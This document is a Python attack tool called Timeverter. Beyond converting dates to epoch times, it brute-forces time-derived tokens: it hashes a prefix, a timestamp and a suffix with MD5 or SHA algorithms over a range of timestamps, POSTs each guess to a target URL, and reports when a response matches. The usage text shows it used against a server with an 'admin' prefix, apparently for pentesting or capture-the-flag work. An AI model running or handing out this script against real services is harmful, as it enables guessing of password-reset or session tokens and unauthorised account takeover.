#!/usr/bin/env python
import time
import datetime
import argparse
import base64, zlib
import requests
import hashlib
from urllib.parse import urlparse # python2: from urlparse import urlparse
import http.client # python2: httplib

############################################################
# Help                                                     #
############################################################
def help():
   # Display Help
   #cat banner.txt | gzip | base64
   encoded_data = "H4sIAAAAAAAAA11RW47DIAz85xTzR5Aas7S7bbc5xF4AyRwkh68fQJM1ssEzFhgPoMZuOFmwmFnphZPyVqPBOeS+BGniVU6o4UR9llTl4FdmdY/qlQc1zNr5IEzRkEYTpEhrBMoVbaVGo6FLRCl+Lmg0mskoX6Nl4IrqxLbNJ3LfXy9j9h2/wCr25/hNoOAF+G/b5s/UiucB/pZ3e1+1ER4d/sElzt9GkvaZ78zyHYrzy8uiMCuc0kQ5pcnPScRVBzGPAewTPE7z0FXYsZs8XUs2DXhmxpuopqfS5iNTfsipm6s4Mr1fq0xSxVFPmfDhDQApq7V0AgAA"
   banner = zlib.decompress(base64.b64decode(encoded_data), 16 + zlib.MAX_WBITS).decode('utf-8')
   print(banner)
   print("Timeverter helps you to bruteforce several kinds of tokens and to convert several time domains.\n")
   print("syntax: timeverter.py [-d DATE] [-e EPOCH] [-h]\n")
   print("date format: [%YYYY-%mm-%ddT%HH-%MM-%SS]")
   print("epoch format: [seconds]\n")

   print("optional arguments:\n")
   
   print("-d DATA, --data DATA        insert data for POST request (i.e. userid=user token=VERTER)")
   print("-D DATE, --date DATE        convert a date to epoch time format")
   print("-div N, --divide N          divide the timestamp by the specified value (used for change the order of magnitude)")
   print("-e EPOCH, --epoch EPOCH     convert epoch time to date format")
   print("-f, --float                 deal timestamp as floating point number")
   print("-fr, --filterregex PATTERN  filter the response for the submitted regex")
   print("-g, --algorithm             specify the algorithm to be used for token computation")
   print("-h, --help                  show this help message and exit")
   print("-mr, --matchregex PATTERN   match the response for the submitted regex")
   print("-mul, --multiply N          multiply the timestamp by the specified value (used for change the order of magnitude)")
   print("-n, --now                   show current local time as epoch and date format")
   print("-p, --prefix PATTERN        specify a prefix string before the timestamp")
   print("-r, --range N               specify a +- offset value of the timestamp in seconds (or other magnitudes according -div and -mul options)")
   print("-s, --suffix PATTERN        specify a suffix string after the timestamp")
   print("-u, --url URL               specify the url")
   print("-U, --utc TIME              show current UTC+N time as epoch and date format")
   print("\n")
   print("Usage examples:")
   print("python timeverter.py -d 2022-03-26T01:13:37 -e 1647135274")
   print("python timeverter.py --utc=-3:30")
   print("python timeverter.py -U +0:00 -r 3000 -g md5 -u http://SERVER_IP:PORT/somefolder/ -d submit=check token=VERTER -fr \"Wrong token\" -mul 1000 -p admin")

class ParseKwargs(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, dict())
        for value in values:
            key, value = value.split('=')
            getattr(namespace, self.dest)[key] = value

def check_url(url):
  urlp = urlparse(url)
  conn = http.client.HTTPConnection(urlp.netloc)
  try:
    conn.request("HEAD", urlp.path)
  except:
    print("%s - Name or service not known" % url)
    exit()
  if conn.getresponse():
    return True
  else:
    return False

#NOTE: utcfromtimestamp(0) starts at 1970-01-01 00:00:00; fromtimestamp(0) starts at 1970-01-01 XX:00:00 where XX depends on your local time, so be careful.

def datetime_to_float(d):
    epoch = datetime.datetime.utcfromtimestamp(0) #NOTE: used utcfromtimestamp(0) and not fromtimestamp(0) because this function is used only on utc functions
    total_seconds =  (d - epoch).total_seconds()
    # total_seconds will be in decimals (millisecond precision)
    return total_seconds

def float_to_datetime(fl):
    return datetime.datetime.utcfromtimestamp(fl)

def current_local_date():
    now = datetime.datetime.now()
    return now

def current_local_epoch():
    epoch = (current_local_date() - datetime.datetime.fromtimestamp(0)).total_seconds()
    return epoch

def current_utc_date(utc):
    hours, minutes = map(float, utc.split(':'))
    utcnow = float_to_datetime(datetime_to_float(datetime.datetime.utcnow()) + ((3600.00 * hours) + (60.00 * minutes)))
    return utcnow

def current_utc_epoch(utc):
    epoch = (current_utc_date(utc) - datetime.datetime.utcfromtimestamp(0)).total_seconds()
    return epoch

def date_to_epoch(date):
    my_date = datetime.datetime.strptime(date, "%Y-%m-%dT%H:%M:%S")
    t = datetime.datetime(my_date.year, my_date.month, my_date.day, my_date.hour, my_date.minute, my_date.second)
    epoch = (t - datetime.datetime.fromtimestamp(0)).total_seconds()
    return epoch

def epoch_to_date(epoch):
    date_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(epoch))
    return date_time

def define_time():
    if args.now:
        ts = current_local_epoch()
    elif args.utc:
        ts = current_utc_epoch(args.utc)
    elif args.date:
        ts = date_to_epoch(args.date)
    else:
        print("Error! Time parameter not defined")
        exit()

    if args.multiply:
        ts *= args.multiply #(i.e. *1000 = milliseconds)
    elif args.divide:
        ts /= args.divide

    return ts

def compute_token(ts):
    if not args.algorithm:
        print ("Error! Specify an algorithm.")
        exit()

    prefix = args.prefix
    suffix = args.suffix
    algo = args.algorithm
    if algo == "md5":
        token = hashlib.md5((prefix + str(ts) + suffix).encode()).hexdigest()
    elif algo == "sha1":
        token = hashlib.sha1((prefix + str(ts) + suffix).encode()).hexdigest()
    elif algo == "sha224":
        token = hashlib.sha224((prefix + str(ts) + suffix).encode()).hexdigest()
    elif algo == "sha256":
        token = hashlib.sha256((prefix + str(ts) + suffix).encode()).hexdigest()
    elif algo == "sha384":
        token = hashlib.sha384((prefix + str(ts) + suffix).encode()).hexdigest()
    elif algo == "sha512":
        token = hashlib.sha512((prefix + str(ts) + suffix).encode()).hexdigest()
    #### can also add OpenSSL algo...
    return token

def token_request():
    key_token_param_index = "VERTER"
    url = args.url
    if not check_url(url):
        print("Error. Target URL is not responsing.")
        exit()
    if args.data: #POST
        if not args.float: ##float option must be fixed
            rng = args.range
            ts = int(define_time())
        else:
            rng = float(args.range)
            ts = define_time()
        for dt in range(ts - rng, ts + rng):
            data = args.data
            hashed_token = compute_token(dt)

            data[list(data.keys())[list(data.values()).index(key_token_param_index)]] = hashed_token #'token' must be dynamic. Leave 'token' for testing purpose
            key_token_param_index = hashed_token
            #print(data)
            print("checking {} {}".format(str(dt), hashed_token))
            # send the request
            res = requests.post(url, data=data)
            # response text check
            if (args.filterregex and not args.filterregex in res.text) or (args.matchregex and args.matchregex in res.text):
                print(res.text)
                print("[*] Congratulations! raw reply printed before")
                print("Time is: "+str(dt))
                exit()

parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("-d", "--data", help="insert data for POST request", nargs='*', action=ParseKwargs)
parser.add_argument("-D", "--date", help="convert a date to epoch time format")
parser.add_argument("-div", "--divide", type=int, help="divide the timestamp by the specified value (used for change the order of magnitude)")
parser.add_argument("-e", "--epoch", type=int, help="convert epoch time to date format")
parser.add_argument("-f", "--float", action='store_true', help="deal timestamp as floating point number")
parser.add_argument("-fr", "--filterregex", help="filter the response for the submitted regex")
parser.add_argument("-g", "--algorithm", choices=["md5", "sha1", "sha224", "sha256", "sha384", "sha512"], help="specify the algorithm to be used for token computation")
parser.add_argument("-h", "--help", action='store_true', help="show this help message and exit")
parser.add_argument("-mr", "--matchregex", help="match the response for the submitted regex")
parser.add_argument("-mul", "--multiply", type=int, help="multiply the timestamp by the specified value (used for change the order of magnitude)")
parser.add_argument("-n", "--now", action='store_true', help="show current local time as epoch and date format")
parser.add_argument("-p", "--prefix", default="", help="specify a prefix string before the timestamp")
parser.add_argument("-r", "--range", type=int, default=0, help="specify a +- offset value of the timestamp in seconds (or other magnitudes according -div and -mul options)")
parser.add_argument("-s", "--suffix", default="", help="specify a suffix string after the timestamp")
parser.add_argument("-u", "--url", help="specify the url")
parser.add_argument("-U", "--utc", choices=["-12:00", "-11:00", "-10:00", "-9:30", "-9:00", "-8:00", "-7:00", "-6:00", "-5:00", "-4:00", "-3:30", "-3:00", "-2:00", "-1:00", "-0:00", "+0:00", "+1:00", "+2:00", "+3:00", "+3:30", "+4:00", "+4:30", "+5:00", "+5:30", "+5:45", "+6:00", "+6:30", "+7:00", "+8:00", "+8:45", "+9:00", "+9:30", "+10:00", "+10:30", "+11:00", "+12:00", "+12:45", "+13:00", "+14:00"], help="show current UTC+N time as epoch and date format")

args = parser.parse_args()

if args.help:
    help()

if args.now and not args.algorithm:
    print("Date time  [local time]: "+str(current_local_date()))
    print("Epoch time [local time]: "+str(current_local_epoch())) #The output is a little skewed because the two functions are called in two different times

if args.utc and not args.algorithm:
    print("Date time  [UTC%s]: " % args.utc +str(current_utc_date(args.utc)))
    print("Epoch time [UTC%s]: " % args.utc +str(current_utc_epoch(args.utc)))

if args.date and not args.algorithm:
    print("Epoch time: "+str(date_to_epoch(args.date)))

if args.epoch and not args.algorithm:
    print("Date time:  "+epoch_to_date(args.epoch))

if args.url:
    token_request()
